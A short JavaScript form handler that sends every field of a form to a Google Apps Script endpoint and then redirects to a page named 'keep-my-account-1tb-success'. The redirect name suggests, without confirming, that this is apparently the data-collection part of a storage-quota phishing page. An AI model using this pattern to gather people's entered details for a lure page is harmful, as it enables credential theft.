const scriptURL = 'https://script.google.com/macros/s/AKfycbxX0yfoPkAigTlpYFhwjZSt96sFGGQlG8jkiJcQMjcUTiOqEwk/exec'
const form = document.forms['submit-to-google-sheet']

form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => window.location.href = "/keep-my-account-1tb-success")
        .catch(error => console.error('Error!', error.message))
})
